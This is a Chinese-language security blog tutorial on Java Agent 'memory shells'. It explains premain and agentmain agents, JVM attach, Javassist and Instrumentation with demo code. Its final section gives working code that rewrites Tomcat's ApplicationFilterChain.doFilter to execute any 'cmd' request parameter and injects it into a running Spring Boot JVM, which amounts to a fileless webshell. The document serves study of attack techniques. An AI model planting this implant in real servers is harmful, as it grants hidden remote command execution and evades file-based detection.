# Java内存马 Java Agent内存马

  
  
&lt;!--more--&gt;  
## 什么是Java Agent？  
Java是一种静态强类型语言，在运行之前必须将其编译成`.class`字节码，然后再交给JVM处理运行。Java Agent就是一种能杂不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的数据。  
实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎实现的呢？  
对于Agent(代理)来讲，其大致可以分为两种，一种是在JVM启动前加载的`premain-Agent`，另一种是JVM启动之后加载的`agentmain-Agent`。这里我们可以将其理解成一种特殊的`Interceptor(拦截器)`，如下图。  
`Premain-Agent`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201519807.png)
`agentmain-Agent`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201520338.png)
## 几种Java Agent实例  
### premain-Agent  
从官方文档中可知，首先必须实现premain方法，同时jar文件的清单(mainfest)中必须要含有`Premain-Class`属性  
在命令行利用`-javaagent`来实现启动时加载。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201522767.png)
premain方法顾名思义，会在我们运行main方法之前进行调用，即在运行main方法之前会先去调用我们jar包中`Premain-Class`类中的`premain`方法  
我们首先来实现一个简单的`premain-Agent`，创建一个Maven项目，编写一个简单的`premain-Agent`，创建的类需要实现`premain`方法  
```java  
package com.java.premain;    
    
import java.lang.instrument.Instrumentation;    
    
public class agent {    
    public static void premain(String args, Instrumentation inst) {    
        for(int i = 0;i&lt;10;i&#43;&#43;){    
            System.out.println(&#34;调用了premain-Agent！&#34;);    
        }    
    }    
}  
```  
接着在resource/META-INF下创建agent.MF清单文件用以指定`premain-Agent`的启动类  
```MF  
Manifest-Version: 1.0    
Premain-Class: com.agent.Java_Agent_premain  
```  
接着用jar命令打包，此时并指定启动项。运行完命令之后将会生成`agent.jar`文件  
```bash  
jar cvfm agent.jar META-INF/maven/MANIFEST.MF com/agent/Java_Agent_premain.class  
```  
接着创建一个目标类  
```java  
public class Hello {    
    public static void main(String[] args) {    
        System.out.println(&#34;Hello World!&#34;);    
    }    
}  
```  
同样创建对应的mf启动项，取名为`hello.mf`  
```mf  
Manifest-Version: 1.0    
Main-Class: Hello  
```  
同样的打包方式  
`jar cvfm Hello.jar META-INF/maven/MANIFEST.MF Hello.class`  
接下载只需要在`jar -jar`中添加`-javaagent:agent.jar`即可在启动时优先加载`agent`，而且可利用如下方式获取传入我们的`agentArgs`参数  
```bash  
java -javaagent:agent.jar=Hello -jar Hello.jar  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201654795.png)
### agentmain-Agent  
相较于premain-Agent只能在JVM启动前加载，`agentmain-Agent`能够在JVM启动后之后加载并实现相应的修改字节码功能，下面了解一下和JVM有关的两个类  
#### VitualMachine类  
`com.sun.tools.attach.VirtualMachine`类可以实现获取JVM信息，内存dump、现成dump、类信息统计(例如JVM加载的类)等功能。  
该类允许我们通过给`attach`方法传入一个JVM的PID，来远程连接到该JVM上，之后我们就可以对连接的JVM进行各种操作，如注入`Agent`。下面是该类的主要方法  
```java  
//允许我们传入一个JVM的PID，然后远程连接到该JVM上  
VirtualMachine.attach()  
   
//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理  
VirtualMachine.loadAgent()  
   
//获得当前所有的JVM列表  
VirtualMachine.list()  
   
//解除与特定JVM的连接  
VirtualMachine.detach()  
```  
#### ViryualMachineDescriptor类  
`com.sun.tools.attach.VirtualMachineDescriptot`类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例  
```java  
    
import com.sun.tools.attach.VirtualMachine;    
import com.sun.tools.attach.VirtualMachineDescriptor;    
import java.util.List;    
public class get_PID {    
    public static void main(String[] args) {    
        //调用VirtualMachine.list()获取正在运行的JVM列表    
        List&lt;VirtualMachineDescriptor&gt; list= VirtualMachine.list();    
        for(VirtualMachineDescriptor vmd:list){    
            //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID    
            if(vmd.displayName().equals(&#34;get_PID&#34;)){    
                System.out.println(vmd.id());    
            }    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201850101.png)
实现一个`agentmain-Agent`，首先编写一个`Sleep_Hello`类，模拟正在运行的JVM  
```java  
import static java.lang.Thread.sleep;    
    
public class Sleep_Hello {    
    public static void main(String[] args) throws InterruptedException {    
        while(true){    
            System.out.println(&#34;Hello World&#34;);    
            sleep(5000);    
        }    
    }    
}  
```  
然后编写我们的`agentmain-Agent`类  
```java  
import java.lang.instrument.Instrumentation;    
    
import static java.lang.Thread.sleep;    
    
public class Java_Agent_agentmain {    
    public static void agentmain(String agentArgs, Instrumentation inst) throws InterruptedException {    
        while(true){    
            System.out.println(&#34;调用了agentmain-Agent&#34;);    
            sleep(3000);    
        }    
    }    
}  
```  
同时配置`agentmain.mf`文件  
```java  
Mainfest-Version: 1.0  
Agent-Class: Java_Agent_agentmain  
```  
接着，编译打包成jar文件  
在pom.xml中添加如下内容  
```java  
&lt;build&gt;    
  &lt;plugins&gt;    
    &lt;plugin&gt;    
      &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;    
      &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;    
      &lt;version&gt;2.6&lt;/version&gt;    
      &lt;configuration&gt;    
        &lt;descriptorRefs&gt;    
          &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;    
        &lt;/descriptorRefs&gt;    
        &lt;archive&gt;    
          &lt;manifestFile&gt;    
            src/main/resources/META-INF/MANIFEST.MF    
          &lt;/manifestFile&gt;    
        &lt;/archive&gt;    
      &lt;/configuration&gt;    
    &lt;/plugin&gt;    
    &lt;plugin&gt;    
      &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;    
      &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;    
      &lt;configuration&gt;    
        &lt;source&gt;6&lt;/source&gt;    
        &lt;target&gt;6&lt;/target&gt;    
      &lt;/configuration&gt;    
    &lt;/plugin&gt;    
  &lt;/plugins&gt;    
&lt;/build&gt;  
```  
用`mvn:assembly`命令打包成jar即可  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201902969.png)
获取两个jar包，我们需要的是第二个，随后我们设置VM-OPTIONS(最大的坑)，这个vm-options在新版UI里面默认是隐藏的，需要打开  
最后准备一个Inject类，将我们的agent-main注入目标JVM：  
```java  
import com.sun.tools.attach.VirtualMachine;    
import com.sun.tools.attach.VirtualMachineDescriptor;    
    
import java.util.List;    
    
public class Inject_Agent {    
    public static void main(String[] args) throws Exception {    
        //调用VirtualMachine.list()获取正在运行的JVM列表    
        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();    
        for (VirtualMachineDescriptor vmd : list) {    
            if(vmd.displayName().equals(&#34;Sleep_Hello&#34;)){    
                //连接指定JVM    
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());    
                //加载Agent    
                virtualMachine.loadAgent(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/HelloDemo/target/HelloDemo-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;);    
                //断开JVM连接    
                virtualMachine.detach();    
            }    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201916707.png)
### 动态修改字节码Instrumentation  
#### Javassist  
##### 什么是Javassist  
Java字节码以二进制的形式存储在`.class`文件中，每一个`.class`文件包含一个Java类或接口。Javassist就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的办法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。  
##### CLassPool  
`ClassPool`是`CtClass`对象的容器。`CtClass`对象必须从该对象获得。如果`get()`在此对象上调用，则它将搜索表示的各种源`ClassPath`以查找类文件，然后创建一个`CtClass`表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放`CtClass`对象的容器。  
获得方法`ClassPool cp = ClassPool.getDefault();`。通过`ClassPool.getDefault()`获取的`ClassPool`获取JVM的类搜索路径。如果程序运行在JBoss或者Tomcat等Web服务器上，ClassPool可能无法找到用户的类，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool必须添加额外的类搜索路径。  
`cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));`  
##### CtdClass  
可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以`ClassPool.get(ClassName)`中获取。  
##### CTMethod  
同理，可以理解成加强版的`Method`对象。可通过`CtClass.getDeclaredMethod(MethodName)`获取，该类提供了一些方法以便我们能够直接修改方法体。  
```java  
public final class CtMethod extends CtBehavior {  
    // 主要的内容都在父类 CtBehavior 中  
}  
   
// 父类 CtBehavior  
public abstract class CtBehavior extends CtMember {  
    // 设置方法体  
    public void setBody(String src);  
   
    // 插入在方法体最前面  
    public void insertBefore(String src);  
   
    // 插入在方法体最后面  
    public void insertAfter(String src);  
   
    // 在方法体的某一行插入内容  
    public int insertAt(int lineNum, String src);  
   
}  
```  
传递给方法`insertBefore()`，`insertAfter()`和`insertAt()`的String对象是由`javassist`的编译器编译的。由于编译器支持语言扩展，以`$`开头的几个标识符有特殊的含义：  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409201937641.png)
##### 使用示例  
pom.xml  
```xml  
&lt;dependency&gt;    
  &lt;groupId&gt;org.javassist&lt;/groupId&gt;    
  &lt;artifactId&gt;javassist&lt;/artifactId&gt;    
  &lt;version&gt;3.27.0-GA&lt;/version&gt;    
&lt;/dependency&gt;  
```  
创建测试类  
```java  
import javassist.*;    
    
public class Javassist_Test {    
    public static void Create_Person() throws Exception{    
        //获取CtClass对象的容器ClassPool    
        ClassPool classPool = ClassPool.getDefault();    
        //创建一个新类Javassist.Learning.Person    
        CtClass ctClass = classPool.makeClass(&#34;javassist.Person&#34;);    
        //创建一个类属性    
        CtField ctField1 = new CtField(classPool.get(&#34;java.lang.String&#34;),&#34;name&#34;,ctClass);    
        //设置属性访问符    
        ctField1.setModifiers(Modifier.PRIVATE);    
        //将name属性添加到Person中    
        ctClass.addField(ctField1,CtField.Initializer.constant(&#34;huahua&#34;));    
        //向Person类中添加setter和getter    
        ctClass.addMethod(CtNewMethod.setter(&#34;setName&#34;,ctField1));    
        ctClass.addMethod(CtNewMethod.getter(&#34;getName&#34;,ctField1));    
        //创建一个无参构造    
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{},ctClass);    
        //设置方法体    
        ctConstructor.setBody(&#34;{name=\&#34;huahua\&#34;;}&#34;);    
        //向Person类中添加无参构造    
        ctClass.addConstructor(ctConstructor);    
    
        //创建一个类方法printName    
        CtMethod ctMethod = new CtMethod(CtClass.voidType,&#34;printName&#34;,new CtClass[]{},ctClass);    
        //设置方法访问符    
        ctMethod.setModifiers(Modifier.PRIVATE);    
        //设置方法体    
        ctMethod.setBody(&#34;{System.out.println(name);}&#34;);    
        //将该方法添加进Person中    
        ctClass.addMethod(ctMethod);    
    
        //将生成的字节码写入文件    
        ctClass.writeFile(&#34;./javassist&#34;);    
    }    
    public static void main(String[] args) throws Exception{    
        Create_Person();    
    }    
}  
```  
生成的`Person.class`  
```java  
//    
// Source code recreated from a .class file by IntelliJ IDEA    
// (powered by FernFlower decompiler)    
//    
    
package javassist;    
    
public class Person {    
    private String name = &#34;huahua&#34;;    
    
    public void setName(String var1) {    
        this.name = var1;    
    }    
    
    public String getName() {    
        return this.name;    
    }    
    
    public Person() {    
        this.name = &#34;huahua&#34;;    
    }    
    
    private void printName() {    
        System.out.println(this.name);    
    }    
}  
```  
由此延展的攻击面其实是，我们可以利用Javassist生成一个恶意的`.class`类。  
#### Instrumentation  
Instrmentation是JVMTIAgent(JVM Tool Interface Agent)的一部分，Java agent通过这个类和目标JVM进行交互，从而达到修改数据的效果。  
其在Java中是一个接口，常用方法如下  
```java  
public interface Instrumentation {  
      
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);  
   
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。  
    void addTransformer(ClassFileTransformer transformer);  
   
    //删除一个类转换器  
    boolean removeTransformer(ClassFileTransformer transformer);  
   
   
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。  
    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;  
   
   
   
    //判断一个类是否被修改  
    boolean isModifiableClass(Class&lt;?&gt; theClass);  
   
    // 获取目标已经加载的类。  
    @SuppressWarnings(&#34;rawtypes&#34;)  
    Class[] getAllLoadedClasses();  
   
    //获取一个对象的大小  
    long getObjectSize(Object objectToSize);  
   
}  
```  
##### ClassFiletransformer  
转换类文件，该接口下只有一个方法`transform`，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在Java Agent内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，于addTransformer搭配使用  
```java  
//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);  
```  
##### 获取目标JVM已加载类  
下面简单实现一个能够获取目标JVM已加载类的`agetmain-Agent`  
```java  
    
import static java.lang.Thread.sleep;    
    
public class Sleep_Hello {    
    public static void main(String[] args) throws InterruptedException {    
        while(true) {    
            hello();    
            sleep(3000);    
        }    
    }    
    public static void hello(){    
        System.out.println(&#34;Hello World!&#34;);    
    }    
}  
```  
Agent主类  
```java  
package com.agent;    
    
import java.lang.instrument.Instrumentation;    
import java.lang.instrument.UnmodifiableClassException;    
    
public class agentmain_transform {    
    public static void agentmain(String args, Instrumentation inst) throws UnmodifiableClassException {    
        Class[] classes = inst.getAllLoadedClasses();    
        //获取目标JVM加载的全部类    
        for(Class cls: classes){    
            if(cls.getName().equals(&#34;Sleep_Hello&#34;)){    
                //添加一个transformer到Instrumentation，并重新触发目标类加载    
                inst.addTransformer(new Hello_Transform(),true);    
                inst.retransformClasses(cls);    
            }    
        }    
    }    
}  
```  
Transformer修改类  
```java  
import javassist.ClassClassPath;    
import javassist.ClassPool;    
import javassist.CtClass;    
import javassist.CtMethod;    
    
import java.lang.instrument.ClassFileTransformer;    
import java.lang.instrument.IllegalClassFormatException;    
import java.security.ProtectionDomain;    
    
public class Hello_Transform implements ClassFileTransformer {    
    @Override    
    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {    
        try{    
            //获取CtClass对象的容器ClassPool    
            ClassPool classPool = ClassPool.getDefault();    
            //添加额外的类所搜路径    
            if(classBeingRedefined == null){    
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);    
                classPool.insertClassPath(ccp);    
            }    
            //获取目标类    
            CtClass ctClass = classPool.get(&#34;Sleep_Hello&#34;);    
            System.out.println(ctClass);    
            //获取目标方法    
            CtMethod ctMethod = ctClass.getDeclaredMethod(&#34;hello&#34;);    
            //设置方法体    
            String body = &#34;{System.out.println(\&#34;Hacker\&#34;);}&#34;;    
            ctMethod.setBody(body);    
    
            //返回目标类字节码    
            byte[] bytes = ctClass.toBytecode();    
            return bytes;    
        }catch (Exception e){    
            e.printStackTrace();    
        }    
        return null;    
    }    
}  
```  
`MANIFEST.MF`需要修改如下  
```java  
Manifest-Version: 1.0    
Agent-Class: com.agent.agentmain_transform    
Can-Redefine-Classes: true    
Can-Retransform-Classes: true  
  
```  
注入类  
```java  
import com.sun.tools.attach.VirtualMachine;    
import com.sun.tools.attach.VirtualMachineDescriptor;    
    
import java.util.List;    
    
public class Inject_Agent {    
    public static void main(String[] args) throws Exception {    
        //调用VirtualMachine.list()获取正在运行的JVM列表    
        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();    
        for (VirtualMachineDescriptor vmd : list) {    
            if(vmd.displayName().equals(&#34;Sleep_Hello&#34;)){    
                //连接指定JVM    
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());    
                //加载Agent    
                virtualMachine.loadAgent(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/HelloDemo/target/HelloDemo-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;);    
                //断开JVM连接    
                virtualMachine.detach();    
            }    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409212051565.png)
#### Instrumentation的局限性  
大多数情况下，我们使用Instrumentation都是使其字节码插桩的功能，简单来说就是类重定义功能(Class Redefine)，但是有以下局限性  
premain和agentmain两种方式修改字节码的实际都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定一个本来不存在类。  
类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义`Instrumentation#redefineClasses`方法，此方法有如下限制  
1. 新类和老类的父类必须相同  
2. 新类和老类实现的接口数也要相同，并且是相同的接口  
3. 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致  
4. 新类和老类新增或删除的方法必须是 private static/final 修饰的  
5. 可以修改方法体  
## Agent内存马实战  
这里准备一个Springboot服务，由于Tomcta的责任链机制，可以看到会按照责链机制反复调用`ApplicationFilterChain#doFilter()`方法  
```java  
public void doFilter(ServletRequest request, ServletResponse response)  
        throws IOException, ServletException {  
   
        if( Globals.IS_SECURITY_ENABLED ) {  
            final ServletRequest req = request;  
            final ServletResponse res = response;  
            try {  
                java.security.AccessController.doPrivileged(  
                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; {  
                            internalDoFilter(req,res);  
                            return null;  
                        }  
                );  
            } ...  
            }  
        } else {  
            internalDoFilter(request,response);  
        }  
    }  
```  
跟到`internalDoFilter()`方法中  
```java  
private void internalDoFilter(ServletRequest request,  
                                  ServletResponse response)  
        throws IOException, ServletException {  
   
        // Call the next filter if there is one  
        if (pos &lt; n) {  
            ...  
        }  
}  
```  
### 利用Java Agent实现Spring Filter内存马  
复用上面的`agentmain-Agent`，修改字节码的关键在于`transformer()`方法，因此重写该方法即可  
```java  
import javassist.ClassClassPath;    
import javassist.ClassPool;    
import javassist.CtClass;    
import javassist.CtMethod;    
    
import java.lang.instrument.ClassFileTransformer;    
import java.lang.instrument.IllegalClassFormatException;    
import java.security.ProtectionDomain;    
    
public class Filter_Transform implements ClassFileTransformer {    
    @Override    
    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {    
        try {    
    
            //获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();    
            //添加额外的类搜索路径    
            if (classBeingRedefined != null) {    
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);    
                classPool.insertClassPath(ccp);    
            }    
    
            //获取目标类    
            CtClass ctClass = classPool.get(&#34;org.apache.catalina.core.ApplicationFilterChain&#34;);    
    
            //获取目标方法    
            CtMethod ctMethod = ctClass.getDeclaredMethod(&#34;doFilter&#34;);    
    
            //设置方法体    
			String body = &#34;{&#34; &#43;    
			        &#34;javax.servlet.http.HttpServletRequest request = $1\n;&#34; &#43;    
			        &#34;String cmd=request.getParameter(\&#34;cmd\&#34;);\n&#34; &#43;    
			        &#34;if (cmd !=null){\n&#34; &#43;    
			        &#34;  Runtime.getRuntime().exec(cmd);\n&#34; &#43;    
			        &#34;System.out.println(\&#34;Hello World\&#34;);\n&#34;&#43;    
			        &#34;  }&#34;&#43;    
			        &#34;}&#34;;  
            ctMethod.setBody(body);    
    
            //返回目标类字节码    
            byte[] bytes = ctClass.toBytecode();    
            return bytes;    
    
        }catch (Exception e){    
            e.printStackTrace();    
        }    
        return null;    
    }    
}  
```  
agent主类  
```java  
import java.lang.instrument.Instrumentation;    
import java.lang.instrument.UnmodifiableClassException;    
    
public class agentmain_transform {    
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException, UnmodifiableClassException {    
        Class [] classes = inst.getAllLoadedClasses();    
    
        //获取目标JVM加载的全部类    
        for(Class cls : classes){    
            if (cls.getName().equals(&#34;org.apache.catalina.core.ApplicationFilterChain&#34;)){    
    
                //添加一个transformer到Instrumentation，并重新触发目标类加载    
                inst.addTransformer(new Filter_Transform(),true);    
                inst.retransformClasses(cls);    
            }    
        }    
    }    
}  
```  
MANIFEST.MF  
```java  
Manifest-Version: 1.0    
Agent-Class: agentmain_transform  
Can-Redefine-Classes: true    
Can-Retransform-Classes: true  
  
```  
Inject类  
```java  
import com.sun.tools.attach.VirtualMachine;    
import com.sun.tools.attach.VirtualMachineDescriptor;    
    
import java.util.List;    
    
public class Inject_Agent {    
    public static void main(String[] args) throws Exception {    
        //调用VirtualMachine.list()获取正在运行的JVM列表      
List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();    
        for (VirtualMachineDescriptor vmd : list) {    
            if(vmd.displayName().equals(&#34;com.example.demo.DemoApplication&#34;)){    
                System.out.println(&#34;Yes&#34;);    
                //连接指定JVM      
VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());    
                //加载Agent      
virtualMachine.loadAgent(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/HelloDemo/target/HelloDemo-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;);    
                //断开JVM连接      
virtualMachine.detach();    
            }    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409212138191.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java%E5%86%85%E5%AD%98%E9%A9%AC-java-agent%E5%86%85%E5%AD%98%E9%A9%AC/  

